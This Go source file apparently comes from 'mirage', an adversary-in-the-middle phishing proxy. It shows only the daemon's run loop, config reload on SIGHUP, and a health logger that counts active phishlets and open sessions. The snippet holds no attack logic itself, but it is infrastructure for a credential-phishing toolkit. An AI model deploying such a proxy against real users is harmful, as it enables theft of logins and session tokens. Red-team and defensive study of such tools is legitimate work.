package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
)

// Run starts the proxy and blocks until the context is cancelled or the proxy
// errors out. SIGHUP triggers a live config reload without stopping the proxy.
func (d *Daemon) Run(ctx context.Context) {
	go d.healthLoop(ctx)

	proxyErr := make(chan error, 1)
	go func() {
		proxyErr <- d.proxy.Start(ctx, fmt.Sprintf(":%d", d.cfg.HTTPSPort))
	}()

	sighup := make(chan os.Signal, 1)
	signal.Notify(sighup, syscall.SIGHUP)
	defer signal.Stop(sighup)

	for {
		select {
		case <-ctx.Done():
			return
		case err := <-proxyErr:
			if err != nil {
				d.logger.Error("proxy error", "error", err)
			}
			return
		case <-sighup:
			d.logger.Info("SIGHUP received — reloading config")
			if err := d.Reload(); err != nil {
				d.logger.Error("config reload failed", "error", err)
			}
		}
	}
}

func (d *Daemon) healthLoop(ctx context.Context) {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			configs, _ := d.phishletStore.ListPhishletConfigs()
			openSessions, _ := d.sessionSvc.Count(aitm.SessionFilter{IncompleteOnly: true})
			activePhishlets := 0
			for _, pcfg := range configs {
				if pcfg.Enabled {
					activePhishlets++
				}
			}
			d.logger.Debug("health",
				"goroutines", runtime.NumGoroutine(),
				"active_phishlets", activePhishlets,
				"open_sessions", openSessions,
				"heap_mb", heapMB(),
			)
		}
	}
}

func heapMB() uint64 {
	var ms runtime.MemStats
	runtime.ReadMemStats(&ms)
	return ms.HeapInuse / 1024 / 1024
}
